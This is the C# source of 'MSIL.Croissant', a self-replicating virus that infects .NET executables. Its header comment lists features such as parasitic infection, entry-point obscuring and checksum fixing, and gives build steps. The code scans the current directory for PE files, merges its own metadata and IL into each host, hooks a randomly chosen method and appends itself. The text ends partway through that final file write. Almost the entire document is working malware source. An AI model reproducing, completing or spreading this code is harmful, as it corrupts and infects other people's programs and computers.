   /*
   MSIL.Croissant by roy g biv (better than any Donut ;) )

   some of its features:
   - parasitic direct action infector of .NET exe (but not looking at suffix)
   - light platform dependence (works on 32-bit and 64-bit Intel, untested on big-endian)
   - infects files in current directory
   - EPO (appends to random method)
   - section attributes are not altered
   - no infect files with data outside of image (eg self-extractors)
   - correct file checksum without using imagehlp.dll :) 100% correct algorithm
   ---

   C++ compatibility:
   No major changes, but requires disabling (somehow) of native code generation

   JScript compatibility:
   No major changes, but requires support for #US stream
   This means check for #US stream, calculation of ustringsdelta, and change to binder file

   VBScript compatibility:
   Major changes - complete rewrite
   ---

   known bugs: no exception handling because EH structures are not copied to host
   This means that replicants will crash if anything goes wrong (eg file in use)
   ---

   to build this thing:

   1. csc croissnt.cs
   2. ildasm -out:croissnt.il croissnt.exe
   3. in croissnt.il, replace all "loca.s" with "loca" (force use of long indexes for variables)
   4. in croissnt.il, replace all "loc.s" with "loc" (force use of long indexes for variables)
   5. in croissnt.il, replace all "loc." with "loc " (force use of long indexes for variables)
   6. ilasm croissnt.il
   7. if any branch is out of range, then remove ".s" from branch, then repeat step 6
   8. bind
   */

   using System;
   using System.Diagnostics;
   using System.IO;
   using System.Runtime.InteropServices;

   class r
   {
       static void Main()
       {
           /* no Unicode strings allowed, so create a string object dynamically
              demo version, current directory only
           */

           String[] files = Directory.GetFiles(Convert.ToString(Convert.ToChar(0x2e)));

           foreach (String filename in files)
           {
               DateTime lastwrite;

               /* check for infection marker (seconds == 0) */

               if ((lastwrite = File.GetLastWriteTime(filename)).Second != 0)
               {
                   FileAttributes attr = File.GetAttributes(filename);

                   File.SetAttributes(filename, 0);
                   FileStream fs = File.Open(filename, FileMode.Open);

                   Byte[] buff;

                   fs.Read(buff = new Byte[0xfc], 0, 0x40);

                   if (BitConverter.ToInt16(buff, 0) == 0x5a4d)
                   {
                       Int32 lfanew;

                       /* the only 32-bit dependencies are filesize (must be < 2Gb) and image base (must be < 4Gb) */

                       fs.Seek(lfanew = BitConverter.ToInt32(buff, 0x3c), 0); /* 0 == SeekOrigin.Begin */
                       fs.Read(buff, 0, 0xfc);

                       /* PE file
                          Intel 386+ or IA64 (64-bit?  yeah baby yeah!)
                          not a system file, not for UP systems, not a DLL
                          "32-bit" executable
                          GUI or CUI
                          not a WDM driver
                          no attribute certificates
                          MSIL file
                       */

                       Int32 rva;

                       if ((BitConverter.ToInt32(buff, 0) == 0x00004550)
                        && (((rva = BitConverter.ToInt16(buff, 4) - 0x14c) == 0)
                         || (rva == 0xb4)
                           )
                        && ((buff[0x17] & 0x70) == 0)
                        && ((BitConverter.ToInt16(buff, 0x16) & 0x102) == 0x102)
                        && ((BitConverter.ToInt16(buff, 0x5c) & -2) == 2)
                        && ((buff[0x5f] & 0x20) == 0)
                        && (BitConverter.ToInt32(buff, (rva &= 0x10) + 0x98) == 0)
                        && ((rva = BitConverter.ToInt32(buff, rva + 0xe8)) != 0)
                          )
                       {
                           /* read entire section table */

                           fs.Seek(BitConverter.ToInt16(buff, 0x14) - 0xe4, SeekOrigin.Current);

                           Int32  sectsize;
                           Byte[] sect = new Byte[(UInt32) (sectsize = BitConverter.ToInt16(buff, 6) * 0x28)];

                           fs.Read(sect, 0, sectsize);

                           /* copy last section to fixed location */

                           Int32 lastsect = (Int32) (fs.Seek(-0x20, SeekOrigin.Current));

                           fs.Read(buff, 0, 0x20);

                           /* read-only last section (because .NET code will not run in writeable section),
                              and no appended bytes
                           */

                           if (((buff[0x1f] & 0x80) == 0)
                            && ((BitConverter.ToInt32(buff, 8) + BitConverter.ToInt32(buff, 0x0c)) == (Int32) (fs.Length))
                              )
                           {
                               Int32 sectcopy = sectsize, raw;

                               /* no subroutines allowed, so inline rvatoraw() */

                               do {} while ((raw = BitConverter.ToInt32(sect, (sectcopy -= 0x28) + 0x0c)) > rva);

                               Int32 rootptroff = (Int32) (fs.Seek(rva - raw + BitConverter.ToInt32(sect, sectcopy + 0x14) + 8, 0)); /* 0 == SeekOrigin.Begin */

                               /* get host Metadata root RVA and size */

                               fs.Read(buff, 0xa0, 0x30);

                               /* check for no StrongNameSignature
                                  or VTableFixups (because we will move a method)
                               */

                               if ((BitConverter.ToInt32(buff, 0xbc) | BitConverter.ToInt32(buff, 0xcc)) == 0)
                               {
                                   Int64 valid;

                                   rva = (Int32) (valid = BitConverter.ToInt64(buff, 0xa0));
                                   sectcopy = sectsize;
                                   do {} while ((raw = BitConverter.ToInt32(sect, (sectcopy -= 0x28) + 0x0c)) > rva);

                                   /* read host Metadata root header */

                                   Int32  rootoff = (Int32) (fs.Seek(rva - raw + BitConverter.ToInt32(sect, sectcopy + 0x14), 0)), rootsize = (Int32) (valid >> 0x20); /* 0 == SeekOrigin.Begin */
                                   Byte[] rootold;

                                   fs.Read(rootold = new Byte[(UInt32) (rootsize)], 0, rootsize);

                                   /* check signature and version, to be certain */

                                   if (BitConverter.ToInt64(rootold, 0) == 0x00010001424a5342) /* BJSB, v1.1 only */
                                   {
                                       Int32   strbase;
                                       Int16   streams, strcpy;
                                       Int32[] basearr = new Int32[(UInt32) ((streams = strcpy = BitConverter.ToInt16(rootold, (strbase = BitConverter.ToInt32(rootold, 0x0c) + 0x14) - 2)) + 1) * 3];

                                       /* skip any extra data */

                                       if ((rootold[strbase - 4] & 1) != 0) /* 1 == STGHDR_EXTRADATA */
                                       {
                                           strbase += BitConverter.ToInt32(rootold, strbase) + 4;
                                       }

                                       Byte  heapsizes = 0;
                                       Int32 baseind = 0, schemaind = 0, stringsind = 0, blobind = 0;

                                       do
                                       {
                                           basearr[baseind + 0] = strbase;
                                           basearr[baseind + 1] = BitConverter.ToInt32(rootold, strbase);
                                           basearr[baseind + 2] = BitConverter.ToInt32(rootold, strbase + 4);

                                           /* check if #~ stream (can be any order) */

                                           if (((raw = BitConverter.ToInt32(rootold, strbase += 8)) & 0x00ffffff) == 0x00007e23)
                                           {
                                               /* must have 16-bit heapsizes,
                                                  and AssemblyRefs, Assemblys, StandAloneSigs, MemberRefs, Methods, TypeRefs
                                                  Int64 class does not support & operator
                                                  and not worth finding how to implement it
                                                  so we use two reads for the 36 bits that we need
                                               */

                                               if ((((heapsizes = rootold[basearr[baseind + 1] + 6]) & 7) != 0) /* 7 == HEAP_BLOB_4 | HEAP_GUID_4 | HEAP_STRING_4 */
                                                || ((BitConverter.ToInt32(rootold, rva = basearr[baseind + 1] + 8) & 0x00020442) != 0x00020442) /* 20442 == StandAloneSigs | MemberRefs | Methods | TypeRefs */
                                                || ((rootold[rva + 4] & 0x09) != 0x09) /* 9 == AssemblyRefs | Assemblys */
                                                  )
                                               {
                                                   break;
                                               }

                                               schemaind = baseind + 1;
                                           }

                                           /* check if #Strings stream */

                                           else if (((rva = BitConverter.ToInt32(rootold, strbase + 4)) == 0x73676e69)
                                                 && (raw == 0x72745323)
                                                 && (rootold[strbase + 8] == 0)
                                                   )
                                           {
                                               /* check that combined #Strings stream < 64kb */

                                               /* variable 0: size of our #Strings stream */

                                               if ((basearr[baseind + 2] + 0x00626772) > 0xffff)
                                               {
                                                   break;
                                               }

                                               stringsind = baseind + 1;
                                           }

                                           /* check if #Blob stream */

                                           else if ((raw == 0x6f6c4223)
                                                 && ((Int16) (rva) == 0x0062)
                                                   )
                                           {
                                               blobind = baseind + 1;
                                           }

                                           /* find end of stream name */

                                           do {} while (rootold[strbase++] != 0);
                                           strbase = (strbase + 3) & -4;
                                           baseind += 3;
                                       }
                                       while (--streams != 0);

                                       /* skip persisted dword, if present */

                                       strbase += ((heapsizes >> 4) & 4);

                                       if ((schemaind != 0)
                                        && (stringsind != 0) /* sanity check */
                                        && (blobind != 0)    /* sanity check */
                                          )
                                       {
                                           Byte[] rootnew;
                                           Int32  hdroff, dataoff = basearr[baseind] = strbase;

                                           /* variable 1: our #~ stream size (TypeRefs + MemberRefs + StandAloneSig) + our #Strings stream size */

                                           Array.Copy(rootold, 0, rootnew = new Byte[(UInt32) ((rootsize - basearr[--blobind + 2] + 0x01626772) & -4)], 0, hdroff = basearr[0]);

                                           --schemaind;
                                           --stringsind;
                                           baseind = 0;

                                           do
                                           {
                                               /* place constant streams at front of array */

                                               if ((baseind != schemaind)
                                                && (baseind != stringsind)
                                                && (baseind != blobind)
                                                  )
                                               {
                                                   Int32 copysize;

                                                   strbase = basearr[baseind];
                                                   Array.Copy(rootold, strbase, rootnew, hdroff, copysize = basearr[baseind + 3] - strbase);
                                                   Array.Copy(rootold, basearr[baseind + 1], rootnew, dataoff, strbase = basearr[baseind + 2]);

                                                   /* update stream offset */

                                                   Marshal.WriteInt32(rootnew, hdroff, dataoff);
                                                   hdroff += copysize;
                                                   dataoff += strbase;
                                               }

                                               baseind += 3;
                                           }
                                           while (--strcpy != 0);

                                           Byte[] codecopy;

                                           /* make local copy of our code */

                                           Int32 ourbase;

                                           /* variable 2: size of our code
                                              variable 3: RVA of our code
                                           */

                                           Marshal.Copy(Marshal.ReadIntPtr((ourbase = Process.GetCurrentProcess().MainModule.BaseAddress.ToInt32()) + 0x03626772, 0), codecopy = new Byte[0x02626772], 0, 0x02626772);

                                           /* copy host #Strings stream */

                                           Array.Copy(rootold, basearr[stringsind], rootnew, hdroff, 0x14);
                                           Array.Copy(rootold, basearr[stringsind + 1], rootnew, dataoff, strbase = basearr[stringsind + 2]);

                                           /* append our #Strings stream to host #Strings stream */

                                           Int32 stroff;

                                           /* variable 4: RVA of our #Strings stream
                                              variable 0: size of our #Strings stream
                                           */

                                           Marshal.Copy(Marshal.ReadIntPtr(ourbase + 0x04626772, 0), rootnew, stroff = dataoff + strbase, 0x00626772);

                                           /* variable 5: previous host #Strings stream size */

                                           Int32 stringsdelta = strbase - 0x05626772;

                                           /* variable 6: RVA in our code of variable 5 */

                                           Marshal.WriteInt32(codecopy, 0x06626772, strbase);

                                           /* update host #Strings stream offset and size */

                                           /* variable 0: size of our #Strings stream */

                                           Marshal.WriteInt64(rootnew, hdroff, ((Int64) (strbase = (strbase + 0x00626772) & -4) << 0x20) + dataoff);
                                           hdroff += 0x14;
                                           dataoff += strbase;

                                           /* update host #~ stream offset and size */

                                           Array.Copy(rootold, basearr[schemaind], rootnew, hdroff, 0x0c);

                                           /* variable 7: size of our TypeRefs + MemberRefs + StandAloneSig */

                                           Marshal.WriteInt64(rootnew, hdroff, ((Int64) ((basearr[schemaind + 2] + 0x07626772) & -4) << 0x20) + dataoff);
                                           hdroff += 0x0c;

                                           /* parse host #~ stream */

                                           valid = BitConverter.ToInt64(rootold, (strbase = (raw = basearr[schemaind + 1]) + 0x1c) - 0x14);

                                           /* calculate number of bytes before host TypeRefs */

                                           Int32 skip1 = BitConverter.ToInt32(rootold, strbase - 4) * 10;

                                           rva = strbase;

                                           /* calculate number of bytes between host TypeRefs and Methods */

                                           Int32 bitmap = (2 << 0x0c) + (6 << 8) + (2 << 4) + 14, skip2 = 0;

                                           baseind = 4;

                                           do
                                           {
                                               if (((Byte) (valid) & 4) != 0)
                                               {
                                                   skip2 += BitConverter.ToInt32(rootold, strbase += 4) * (bitmap & 0x0f);
                                               }

                                               valid >>= 1;
                                               bitmap >>= 4;
                                           }
                                           while (--baseind != 0);

                                           /* save and update host TypeRefs count */

                                           Int32 typerefs;

                                           /* check that combined Typerefs count < 32
                                              more than 31 Typerefs requires size-extending many objects
                                           */

                                           /* variable 8: number of our TypeRefs */

                                           if ((baseind = (typerefs = BitConverter.ToInt32(rootold, rva)) + 0x08626772) < 0x20)
                                           {
                                               Marshal.WriteInt32(rootold, rva, baseind);

                                               Int32 methods = BitConverter.ToInt32(rootold, strbase += 4), skip3 = 0;

                                               /* calculate number of bytes between host Methods and MemberRefs */

                                               bitmap = (4 << 8) + (6 << 4) + 2;
                                               baseind = 3;

                                               do
                                               {
                                                   if (((Byte) (valid) & 8) != 0)
                                                   {
                                                       skip3 += BitConverter.ToInt32(rootold, strbase += 4) * (bitmap & 0x0f);
                                                   }

                                                   valid >>= 1;
                                                   bitmap >>= 4;
                                               }
                                               while (--baseind != 0);

                                               rva = strbase += 4;

                                               /* calculate number of bytes between host MemberRefs and StandAloneSigs */

                                               Int32 skip4 = 0;

                                               bitmap = (4 << 0x14) + (6 << 0x10) + (6 << 0x0c) + (4 << 8) + (6 << 4) + 6;
                                               baseind = 6;

                                               do
                                               {
                                                   if (((Byte) (valid) & 0x10) != 0)
                                                   {
                                                       skip4 += BitConverter.ToInt32(rootold, strbase += 4) * (bitmap & 0x0f);
                                                   }

                                                   valid >>= 1;
                                                   bitmap >>= 4;
                                               }
                                               while (--baseind != 0);

                                               /* save and update host MemberRefs count */

                                               Int32 memberrefs;

                                               /* variable 9: number of our MemberRefs */

                                               Marshal.WriteInt32(rootold, rva, (memberrefs = BitConverter.ToInt32(rootold, rva)) + 0x09626772);

                                               rva = strbase += 4;

                                               /* calculate number of bytes between host StandAloneSigs and AssemblyRefs */

                                               Int32 skip5 = 0;

                                               bitmap = (1 << 0x1b) + (1 << 0x18) + (3 << 0x15) + (3 << 0x12) + (3 << 0x0f) + (1 << 0x0c) + (2 << 9) + (3 << 6) + (1 << 3) + 2;
                                               baseind = 0x0a;

                                               do
                                               {
                                                   if (((Byte) (valid) & 0x20) != 0)
                                                   {
                                                       skip5 += BitConverter.ToInt32(rootold, strbase += 4) * (bitmap & 7) * 2;
                                                   }

                                                   valid >>= 1;
                                                   bitmap >>= 3;
                                               }
                                               while (--baseind != 0);

                                               bitmap = (6 << 0x18) + (2 << 0x14) + (11 << 0x10) + (2 << 0x0c) + (4 << 8) + (3 << 4) + 4;
                                               baseind = 7;

                                               do
                                               {
                                                   if (((Byte) (valid) & 0x20) != 0)
                                                   {
                                                       skip5 += BitConverter.ToInt32(rootold, strbase += 4) * (bitmap & 0x0f) * 2;
                                                   }

                                                   valid >>= 1;
                                                   bitmap >>= 4;
                                               }
                                               while (--baseind != 0);

                                               /* get number of host AssemblyRefs */

                                               bitmap = BitConverter.ToInt32(rootold, strbase += 4);

                                               /* skip remaining rows */

                                               baseind = 7;

                                               do
                                               {
                                                   if (((Byte) (valid) & 0x40) != 0)
                                                   {
                                                       strbase += 4;
                                                   }

                                                   valid >>= 1;
                                               }
                                               while (--baseind != 0);

                                               /* must be at least 2 AssemblyRefs */

                                               if (bitmap >= 2)
                                               {
                                                   /* save and update host StandAloneSigs count */

                                                   Int32 standalonesigs;

                                                   Marshal.WriteInt32(rootold, rva, (standalonesigs = BitConverter.ToInt32(rootold, rva)) + 1);

                                                   /* copy up to end of host TypeRefs */

                                                   Array.Copy(rootold, raw, rootnew, dataoff, baseind = strbase - raw + 4 + skip1 + (typerefs * 6));
                                                   raw += baseind;

                                                   Int32 trefoff;

                                                   /* append our TypeRefs */

                                                   /* variable 10: RVA of our TypeRefs
                                                      variable 11: size of our TypeRefs
                                                   */

                                                   Marshal.Copy(Marshal.ReadIntPtr(ourbase + 0x0a626772, 0), rootnew, trefoff = (dataoff += baseind), 0x0b626772);

                                                   /* if the first two AssemblyRefs are "mscorlib" and "System", then we don't need to fix the ResolutionScope indexes */

                                                   /* fix up host Name string offset, NameSpace string offset */

                                                   /* variable 8: number of our TypeRefs */

                                                   baseind = 0x08626772;

                                                   do
                                                   {
                                                       rva = BitConverter.ToInt32(rootnew, dataoff + 2);
                                                       Marshal.WriteInt32(rootnew, dataoff + 2, (Int32) (((rva + (stringsdelta << 0x10)) & unchecked((Int32) (0xffff0000))) + ((rva + stringsdelta) & 0xffff)));
                                                       dataoff += 6;
                                                   }
                                                   while (--baseind != 0);

                                                   /* copy up to end of host MemberRefs */

                                                   Array.Copy(rootold, raw, rootnew, dataoff, baseind = skip2 + (methods * 14) + skip3 + (memberrefs * 6));
                                                   raw += baseind;

                                                   Int32 methodoff = dataoff + skip2 - 0x14, mrefoff;

                                                   /* append our MemberRefs */

                                                   /* variable 12: RVA of our MemberRefs
                                                      variable 13: size of our MemberRefs
                                                   */

                                                   Marshal.Copy(Marshal.ReadIntPtr(ourbase + 0x0c626772, 0), rootnew, mrefoff = (dataoff += baseind), 0x0d626772);

                                                   /* variable 14: previous host number of MemberRefs */

                                                   Int32 mrefdelta = (memberrefs - 0x0e626772) << 3;

                                                   /* variable 15: RVA in our code of variable 14 */

                                                   Marshal.WriteInt32(codecopy, 0x0f626772, memberrefs);

                                                   /* variable 16: previous host #Blob stream size */

                                                   Int32 blobsize, blobdelta = (blobsize = basearr[blobind + 2]) - 0x10626772;

                                                   /* variable 17: RVA in our code of variable 16 */

                                                   Marshal.WriteInt32(codecopy, 0x11626772, blobsize);

                                                   Byte[] ourblob;
                                                   Int32  blobbase;

                                                   /* make local copy of our #Blob stream */

                                                   /* variable 18: size of our #Blob stream
                                                      variable 19: RVA of our #Blob stream
                                                   */

                                                   Marshal.Copy(Marshal.ReadIntPtr(blobbase = ourbase + 0x13626772, 0), ourblob = new Byte[0x12626772], 0, 0x12626772);

                                                   /* variable 20: previous host number of TypeRefs */

                                                   Int32 trefdelta = (typerefs - 0x14626772) << 2;

                                                   /* variable 21: RVA in our code of variable 20 */

                                                   Marshal.WriteInt32(codecopy, 0x15626772, typerefs);

                                                   Byte opcode;

                                                   /* fix up host Class coded index, Name string offset, Signature blob offset */

                                                   /* variable 9: number of our MemberRefs */

                                                   baseind = 0x09626772;

                                                   do
                                                   {
                                                       /* Int64 class does not support & operator
                                                          and not worth finding how to implement it
                                                          so we use two reads for the 48 bits that we need
                                                       */

                                                       Marshal.WriteInt16(rootnew, dataoff, (Int16) (BitConverter.ToInt16(rootnew, dataoff) + mrefdelta));
                                                       rva = BitConverter.ToInt32(rootnew, dataoff + 2);
                                                       Marshal.WriteInt32(rootnew, dataoff + 2, (Int32) (((rva + (blobdelta << 0x10)) & unchecked((Int32) (0xffff0000))) + ((rva + stringsdelta) & 0xffff)));

                                                       /* fix MemberRef token indexes */

                                                       /* variable 22: previous host #Blob stream size (duplicated variable)
                                                          duplicated variables (not constants) require unique declarations
                                                       */

                                                       bitmap = ourblob[strbase = (rva >> 0x10) - 0x16626772] - 1;

                                                       /* variable 23: RVA in our code of variable 22 */

                                                       Marshal.WriteInt32(codecopy, 0x17626772, blobsize);

                                                       strbase += 2;

                                                       do
                                                       {
                                                           if (((opcode = ourblob[strbase]) == 0x1d)
                                                            || ((UInt32) (opcode - 0x0f) <= 3)
                                                              )
                                                           {
                                                               ++strbase;
                                                               --bitmap;

                                                               if ((UInt32) (opcode - 0x11) <= 1)
                                                               {
                                                                   ourblob[strbase] += (Byte) (trefdelta);
                                                               }
                                                           }

                                                           ++strbase;
                                                       }
                                                       while (--bitmap != 0);

                                                       dataoff += 6;
                                                   }
                                                   while (--baseind != 0);

                                                   /* copy up to end of host StandAloneSigs */

                                                   Array.Copy(rootold, raw, rootnew, dataoff, baseind = skip4 + (standalonesigs * 2));
                                                   raw += baseind;

                                                   /* append our StandAloneSig */

                                                   Int32 blobtotal;

                                                   /* variable 18: size of our #Blob stream */

                                                   Marshal.WriteInt16(rootnew, dataoff += baseind, (Int16) (blobtotal = blobsize + 0x12626772));

                                                   /* check AssemblyRef names
                                                      we require "mscorlib" and "System", case-sensitive, in that order
                                                      to remove the System dependency requires building strings dynamically
                                                      and using the GetMethod() method to load the System.dll at runtime
                                                   */

                                                   if ((BitConverter.ToInt64(rootold, baseind = (bitmap = basearr[stringsind + 1]) + BitConverter.ToInt16(rootold, raw + skip5 + 0x0e)) == 0x62696C726F63736D)
                                                    && (rootold[baseind + 8] == 0)
                                                    && (BitConverter.ToInt32(rootold, baseind = bitmap + BitConverter.ToInt16(rootold, raw + skip5 + 0x22)) == 0x74737953)
                                                    && ((BitConverter.ToInt32(rootold, baseind + 4) & 0x00ffffff) == 0x00006D65)
                                                      )
                                                   {
                                                       Int32 randsig, sigoff, siglen;

                                                       /* choose random host StandAloneSig */

                                                       if (((siglen = rootold[sigoff = basearr[blobind + 1] + (Int32) (BitConverter.ToInt16(rootnew, baseind = dataoff - ((randsig = (new Random((int) (DateTime.Now.Ticks))).Next(standalonesigs) + 1) << 1)))]) & 0x80) != 0)
                                                       {
                                                           siglen = ((siglen & 0x3f) << 8) + rootold[++sigoff];
                                                       }

                                                       /* check that combined #Blob stream < 64kb */

                                                       /* variable 24: size of our locals */

                                                       if ((blobtotal += (rva = siglen + 0x18626772)) <= 0xffff)
                                                       {
                                                           /* copy rest of host #~ stream */

                                                           Array.Copy(rootold, raw, rootnew, dataoff + 2, baseind = basearr[schemaind + 1] + basearr[schemaind + 2] - raw);
                                                           dataoff = (dataoff + baseind + 5) & -4;

                                                           /* update host #Blob stream offset and size */

                                                           Array.Copy(rootold, basearr[blobind], rootnew, hdroff, 0x10);
                                                           Marshal.WriteInt64(rootnew, hdroff, ((Int64) (blobtotal = (blobtotal + 5) & -4) << 0x20) + dataoff);
                                                           hdroff += 0x10;

                                                           /* copy host #Blob stream */

                                                           Byte[] blobnew;

                                                           Array.Copy(rootold, basearr[blobind + 1], blobnew = new Byte[(UInt32) (blobtotal)], 0, strbase = basearr[blobind + 2]);

                                                           /* append our #Blob stream to host #Blob stream */

                                                           Int32 bloboff;

                                                           /* variable 18: size of our #Blob stream */

                                                           Array.Copy(ourblob, 0, blobnew, bloboff = strbase, 0x12626772);
                                                           strbase += 0x12626772;

                                                           /* store combined locals size */

                                                           if (rva > 0xff)
                                                           {
                                                               blobnew[strbase++] = (Byte) ((rva >> 8) | 0x80);
                                                           }

                                                           blobnew[strbase] = (Byte) (rva);
                                                           blobnew[strbase + 1] = 7; /* 7 == IMAGE_CEE_CS_CALLCONV_LOCAL_SIG */

                                                           /* get host locals count */

                                                           if (((blobind = rootold[sigoff += 2]) & 0x80) != 0)
                                                           {
                                                               blobind = ((blobind & 0x3f) << 8) + rootold[++sigoff];
                                                               --siglen;
                                                           }

                                                           /* store combined locals count */

                                                           /* variable 25: number of our locals */

                                                           if ((blobind += 0x19626772) > 0xff)
                                                           {
                                                               blobnew[++strbase + 1] = (Byte) ((blobind >> 8) | 0x80);
                                                           }

                                                           blobnew[strbase + 2] = (Byte) (blobind);

                                                           /* copy host locals */

                                                           Array.Copy(rootold, sigoff + 1, blobnew, strbase + 3, siglen - 2);

                                                           /* append our locals */

                                                           /* variable 24: size of our locals
                                                              variable 26: RVA within our #Blob stream of our locals
                                                           */

                                                           Marshal.Copy(Marshal.ReadIntPtr(blobbase + 0x1a626772, 0), blobnew, strbase += siglen + 1, 0x18626772);

                                                           /* fix up host token references */

                                                           /* variable 25: number of our locals */

                                                           stringsind = 0x19626772;

                                                           do
                                                           {
                                                               if (((opcode = blobnew[strbase]) == 0x1d)
                                                                || ((UInt32) (opcode - 0x0f) <= 3)
                                                                  )
                                                               {
                                                                   ++strbase;

                                                                   if ((UInt32) (opcode - 0x11) <= 1)
                                                                   {
                                                                       blobnew[strbase] += (Byte) (typerefs << 2);
                                                                   }
                                                               }

                                                               ++strbase;
                                                           }
                                                           while (--stringsind != 0);

                                                           /* find first method using selected StandAloneSig */

                                                           do
                                                           {
                                                               rva = BitConverter.ToInt32(rootnew, methodoff += 0x14);
                                                               do {} while ((raw = BitConverter.ToInt32(sect, (sectsize -= 0x28) + 0x0c)) > rva);

                                                               fs.Seek((dataoff = rva - raw + BitConverter.ToInt32(sect, sectsize + 0x14)), 0); /* 0 == SeekOrigin.Begin */
                                                               fs.Read(buff, 0xa0, 0x0c); /* assuming 3 dwords for the header, but actual count is in the header (>> 0x0c, & 0x0f) */
                                                           }
                                                           while (((buff[0xa0] & 7) == 3) /* 3 == CorILMethod_FatFormat (only Fat type supports locals) */
                                                               && ((BitConverter.ToInt32(buff, 0xa8) & 0x00ffffff) != randsig)
                                                                 );

                                                           /* check that host contains no exception handling information */

                                                           if ((buff[0xa0] & 8) == 0) /* 8 == CORILMETHOD_MORESECTS */
                                                           {
                                                               /* store new host method RVA */

                                                               Marshal.WriteInt32(rootnew, methodoff, (rva = BitConverter.ToInt32(buff, 4)) + (raw = BitConverter.ToInt32(buff, 8)));

                                                               /* read host method */

                                                               fs.Seek(-0x0c, SeekOrigin.Current);
                                                               baseind = BitConverter.ToInt32(buff, 0xa4) - 1;
                                                               fs.Read(rootold = new Byte[(UInt32) (baseind + 0x0c)], 0, baseind + 0x0c);

                                                               /* store new host method stack size */

                                                               /* variable 27: size of our stack */

                                                               Marshal.WriteInt16(rootold, 2, (Int16) (BitConverter.ToInt16(rootold, 2) + 0x1b626772));

                                                               /* store new host method size and StandAloneSig index */

                                                               /* variable 2: size of our code */

                                                               Marshal.WriteInt64(rootold, 4, ((Int64) (standalonesigs + 0x11000001) << 0x20) + (sectsize = baseind + 0x02626772));

                                                               /* variable 28: RVA in our code of variable 3 */

                                                               Marshal.WriteInt32(codecopy, 0x1c626772, dataoff = rva + raw + baseind + 0x0c);

                                                               /* variable 29: RVA in our code of variable 4 */

                                                               Marshal.WriteInt32(codecopy, 0x1d626772, (strbase = (dataoff + (sectcopy = sectsize - (sigoff = rootold.GetLength(0)) + 0x0c) + 3) & -4) + stroff);

                                                               /* variable 30: RVA in our code of variable 10 */

                                                               Marshal.WriteInt32(codecopy, 0x1e626772, strbase + trefoff);

                                                               /* variable 31: RVA in our code of variable 12 */

                                                               Marshal.WriteInt32(codecopy, 0x1f626772, strbase + mrefoff);

                                                               /* variable 32: RVA in our code of variable 19 */

                                                               Marshal.WriteInt32(codecopy, 0x20626772, strbase + (baseind = siglen = rootnew.GetLength(0)) + bloboff);

                                                               /* variable 33: previous host locals count */

                                                               Int32 localsdelta = standalonesigs - 0x21626772;

                                                               /* variable 34: RVA in our code of variable 33 */

                                                               Marshal.WriteInt32(codecopy, 0x22626772, standalonesigs);

                                                               /* parse our code */

                                                               mrefdelta >>= 3;
                                                               blobind = 0;

                                                               do
                                                               {
                                                                   if (((opcode = codecopy[blobind++]) == 0x1f) /* ldc.i4.s */
                                                                    || ((UInt32) (opcode - 0x2b) <= 0x0c) /* bcond.s */
                                                                    || (opcode == 0xde) /* leave.s */
                                                                      )
                                                                   {
                                                                       ++blobind;
                                                                   }
                                                                   else if ((opcode == 0x20) /* ldc.i4 */
                                                                         || (opcode == 0x22) /* ldc.r4 */
                                                                         || ((UInt32) (opcode - 0x38) <= 0x0c) /* bcond */
                                                                         || (opcode == 0xdd) /* leave */
                                                                           )
                                                                   {
                                                                       blobind += 4;
                                                                   }
                                                                   else if ((opcode == 0x21) /* ldc.i8 */
                                                                         || (opcode == 0x23) /* ldc.r8 */
                                                                           )
                                                                   {
                                                                       blobind += 8;
                                                                   }
                                                                   else if (((UInt32) (opcode - 0x27) <= 2) /* jmp, call */
                                                                         || ((UInt32) (opcode - 0x6f) <= 6) /* calli, callvirt, cpobj, ldobj, ldstr, newobj, castclass, isinst */
                                                                         || (opcode == 0x79) /* unbox */
                                                                         || ((UInt32) (opcode - 0x7b) <= 6) /* ldfld, ldflda, stfld, ldsfld, ldsflda, stsfld, stobj */
                                                                         || ((UInt32) (opcode - 0x8c) <= 1) /* box, newarr */
                                                                         || (opcode == 0x8f) /* ldelema */
                                                                         || (opcode == 0xc2) /* refanyval */
                                                                         || (opcode == 0xc6) /* mkrefany */
                                                                         || (opcode == 0xd0) /* ldtoken */
                                                                           )
                                                                   {
                                                                       Marshal.WriteInt32(codecopy, blobind, BitConverter.ToInt32(codecopy, blobind) + mrefdelta);
                                                                       blobind += 4;
                                                                   }
                                                                   else if (opcode == 0x45) /* switch */
                                                                   {
                                                                       blobind += (BitConverter.ToInt32(codecopy, blobind) + 1) * 4;
                                                                   }
                                                                   else if (opcode == 0xfe) /* prefix1 */
                                                                   {
                                                                       if ((opcode = codecopy[blobind++]) == 0x12) /* unaligned */
                                                                       {
                                                                           ++blobind;
                                                                       }
                                                                       else if (((UInt32) (opcode - 0x06) <= 1) /* ldftn, ldvirtftn */
                                                                             || (opcode == 0x15) /* initobj */
                                                                             || (opcode == 0x1c) /* sizeof */
                                                                               )
                                                                       {
                                                                           Marshal.WriteInt32(codecopy, blobind, BitConverter.ToInt32(codecopy, blobind) + mrefdelta);
                                                                           blobind += 4;
                                                                       }
                                                                       else if ((UInt32) (opcode - 0x09) <= 5) /* ldarg, ldarga, starg, ldloc, ldloca, stloc */
                                                                       {
                                                                           Marshal.WriteInt16(codecopy, blobind, (Int16) (BitConverter.ToInt16(codecopy, blobind) + localsdelta));
                                                                           blobind += 2;
                                                                       }
                                                                   }

                                                                   /* variable 2: size of our code */
                                                               }
                                                               while (blobind != 0x02626772);

                                                               /* update host Metadata root RVA and size */

                                                               Marshal.WriteInt64(buff, 0xa0, ((Int64) (baseind += (blobind = blobnew.GetLength(0))) << 0x20) + (rva + raw + (blobtotal = (sectsize + 0x0f) & -4)));
                                                               fs.Seek(rootptroff, 0); /* 0 == SeekOrigin.Begin */
                                                               fs.Write(buff, 0xa0, 8);

                                                               /* update host last section virtual size */

                                                               Marshal.WriteInt32(buff, 0, blobtotal += raw + baseind);

                                                               /* update host last section raw size */

                                                               baseind = BitConverter.ToInt32(buff, 0x3c) - 1;
                                                               Marshal.WriteInt32(buff, 8, blobtotal = (blobtotal + baseind) & ~baseind);
                                                               fs.Seek(lastsect, 0); /* 0 == SeekOrigin.Begin */
                                                               fs.Write(buff, 0, 0x0c);

                                                               /* update host image size */

                                                               baseind = BitConverter.ToInt32(buff, 0x38) - 1;
                                                               Marshal.WriteInt32(buff, 0x50, (blobtotal + rva + baseind) & ~baseind);
                                                               raw = BitConverter.ToInt32(buff, 0x58);
                                                               Marshal.WriteInt32(buff, 0x58, 0);
                                                               fs.Seek(lfanew + 0x50, 0); /* 0 == SeekOrigin.Begin */
                                                               fs.Write(buff, 0x50, 0x0c);

                                                               /* append our data */

                                                               fs.Seek(0, SeekOrigin.End);
                                                               fs.Write(rootold, 0, sigoff);
                                                               fs.Write(codecopy, 0, sectcopy);
